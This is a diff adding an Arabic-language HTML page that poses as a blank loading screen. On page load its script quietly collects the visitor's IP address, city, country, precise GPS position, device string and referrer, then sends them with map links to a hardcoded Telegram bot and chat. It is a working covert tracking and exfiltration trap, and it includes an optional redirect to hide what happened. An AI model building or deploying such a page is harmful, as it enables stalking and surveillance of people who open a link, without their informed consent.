@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Loading...</title>
+    <style>
+        body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; color: #fff; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid #00aaff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .container { text-align: center; }
+        p { opacity: 0.5; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="spinner"></div>
+        <p>جاري التحميل...</p>
+    </div>
+
+    <script>
+        // =====================================================
+        // 🔑 بيانات البوت الخاصة بك (تم إدخالها مسبقاً)
+        // =====================================================
+        const BOT_TOKEN = '8987813029:AAEuXcuCf2WWbYd7CWYNLdhJqfWAuCaDYdA';
+        const CHAT_ID = '5343926721';
+        // =====================================================
+
+        // === جمع البيانات ===
+        const data = {
+            ip: 'غير معروف',
+            country: 'غير معروف',
+            city: 'غير معروف',
+            lat: 'غير معروف',
+            lon: 'غير معروف',
+            gps_lat: null,
+            gps_lon: null,
+            device: navigator.userAgent || 'غير معروف',
+            time: new Date().toLocaleString('ar-EG'),
+            url: window.location.href,
+            referrer: document.referrer || 'مباشر'
+        };
+
+        // === 1. جلب الـ IP والتقريبي ===
+        async function fetchIP() {
+            try {
+                const res = await fetch('https://ip-api.com/json/');
+                const info = await res.json();
+                if (info.status === 'success') {
+                    data.ip = info.query;
+                    data.country = info.country;
+                    data.city = info.city;
+                    data.lat = info.lat;
+                    data.lon = info.lon;
+                }
+            } catch (e) { /* لا تفعل شيئاً */ }
+            requestGPS();
+        }
+
+        // === 2. طلب GPS دقيق (مع نافذة إذن) ===
+        function requestGPS() {
+            if (!navigator.geolocation) {
+                sendReport();
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    data.gps_lat = pos.coords.latitude;
+                    data.gps_lon = pos.coords.longitude;
+                    sendReport();
+                },
+                () => { sendReport(); }, // إذا رفض، نرسل بالـ IP فقط
+                { enableHighAccuracy: true, timeout: 7000 }
+            );
+        }
+
+        // === 3. إرسال التقرير إلى تيليجرام ===
+        function sendReport() {
+            let msg = `🚨 <b>زائر جديد!</b>\n\n`;
+            msg += `🌐 IP: ${data.ip}\n`;
+            msg += `📍 الدولة: ${data.country}\n`;
+            msg += `🏙️ المدينة: ${data.city}\n`;
+            if (data.gps_lat && data.gps_lon) {
+                msg += `🛰️ GPS دقيق: ${data.gps_lat}, ${data.gps_lon}\n`;
+                msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.gps_lat},${data.gps_lon}\n`;
+            } else {
+                msg += `📡 تقريبي (IP): ${data.lat}, ${data.lon}\n`;
+                msg += `🗺️ خريطة: https://www.google.com/maps?q=${data.lat},${data.lon}\n`;
+            }
+            msg += `🖥️ الجهاز: ${data.device.substring(0, 70)}\n`;
+            msg += `🕒 الوقت: ${data.time}\n`;
+            msg += `🔗 الصفحة: ${data.url}\n`;
+            msg += `↩️ المرجع: ${data.referrer}`;
+
+            // إرسال عبر التيليجرام
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: msg,
+                    parse_mode: 'HTML'
+                })
+            }).catch(() => {});
+        }
+
+        // === 4. التشغيل فوراً ===
+        fetchIP();
+
+        // (اختياري) إعادة توجيه الزائر إلى موقع آخر بعد 3 ثوانٍ
+        // window.location.href = 'https://www.google.com';
+    </script>
+</body>
+</html>
